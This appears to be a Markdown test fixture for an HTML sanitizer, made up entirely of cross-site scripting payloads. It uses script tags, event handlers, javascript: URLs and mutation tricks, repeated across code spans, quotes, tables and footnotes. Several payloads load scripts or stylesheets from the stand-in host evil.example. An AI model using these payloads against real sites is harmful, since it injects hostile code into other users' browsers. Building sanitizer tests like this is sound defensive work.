# Scripts and event handlers

<script>alert(1)</script>

<SCRIPT SRC=//evil.example/x.js></SCRIPT>

<script type="module">import('https://evil.example/x.js')</script>

<img src=x onerror=alert(1)>

<svg onload=alert(1)><script>alert(1)</script></svg>

<body onload=alert(1)>

<iframe src="javascript:alert(1)"></iframe>

<iframe srcdoc="<script>alert(1)</script>"></iframe>

<a href="javascript:alert(1)">a link in HTML</a>

<div style="background:url(javascript:alert(1))">styled</div>

<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>

<details open ontoggle=alert(1)><summary>x</summary></details>

<object data="javascript:alert(1)"></object>

<embed src="data:text/html,<script>alert(1)</script>">

<form action="javascript:alert(1)"><button>submit</button></form>

<input autofocus onfocus=alert(1)>

<video><source onerror=alert(1)></video>

<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<base href="javascript:alert(1)//">

<link rel=stylesheet href=//evil.example/x.css>

<style>@import 'https://evil.example/x.css'; body { background: url(https://evil.example/t.png) }</style>

<template><script>alert(1)</script></template>

<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>

<!--<script>alert(1)</script>-->

<![CDATA[<script>alert(1)</script>]]>

<?xml-stylesheet href="javascript:alert(1)"?>

Inline: x <img src=x onerror=alert(1)> y <b onmouseover=alert(1)>z</b> <a href=javascript:alert(1)>w</a>

Unclosed: <script>alert(1)

`<script>alert(1)</script>` in code

```html
<script>alert(1)</script>
```

> <script>alert(1)</script> in a quote

- <img src=x onerror=alert(1)> in a list

| <script>alert(1)</script> | <img src=x onerror=alert(1)> |
|---|---|
| <iframe src=javascript:alert(1)> | x |

[<img src=x onerror=alert(1)>](https://example.com)

![<script>alert(1)</script>](https://camo.githubusercontent.com/a)

[^1]: <script>alert(1)</script> in a footnote

A footnote[^1].
